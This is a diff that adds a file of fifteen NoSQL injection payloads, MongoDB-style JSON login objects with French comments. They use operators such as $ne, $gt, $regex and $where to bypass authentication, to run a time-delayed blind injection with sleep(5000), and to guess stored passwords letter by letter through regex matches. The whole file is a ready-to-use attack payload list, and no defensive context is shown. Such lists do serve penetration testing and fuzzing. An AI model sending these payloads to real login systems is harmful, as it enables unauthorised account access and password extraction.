@@ -1,0 +1,15 @@
+{"username": {"$ne": null}, "password": {"$ne": null}}  # Auth bypass simple
+{"username": {"$gt": ""}, "password": {"$gt": ""}}      # Auth bypass via opérateur $gt
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}  # Auth bypass via regex
+{"username": {"$in": ["admin", "user"]}, "password": {"$ne": null}}  # Auth bypass avec $in
+{"username": {"$where": "this.password.length < 1"}}  # Injection avec $where
+{"username": {"$where": "sleep(5000)"}}  # Injection aveugle avec délai
+{"username": {"$regex": "^a.*"}}  # Injection aveugle avec regex
+{"username": {"$ne": "admin"}, "password": {"$ne": "admin"}}  # Auth bypass par négation
+{"username": {"$eq": "admin"}, "password": {"$ne": "wrongpass"}}  # Auth bypass avec $eq et $ne
+{"username": {"$or": [{"$ne": null}, {"$gt": ""}]}, "password": {"$ne": null}}  # Injection logique avec $or
+{"username": {"$where": "this.password.match(/.*/)"}, "password": {"$ne": null}}  # Injection avec match regex
+{"username": {"$where": "this.password.match(/^a/)"}, "password": {"$ne": null}}  # Injection ciblée avec match regex
+{"username": {"$where": "this.password.match(/^b/)"}, "password": {"$ne": null}}  # Injection ciblée avec match regex
+{"username": {"$where": "this.password.match(/^c/)"}, "password": {"$ne": null}}  # Injection ciblée avec match regex
+{"username": {"$where": "this.password.match(/^d/)"}, "password": {"$ne": null}}  # Injection ciblée avec match regex
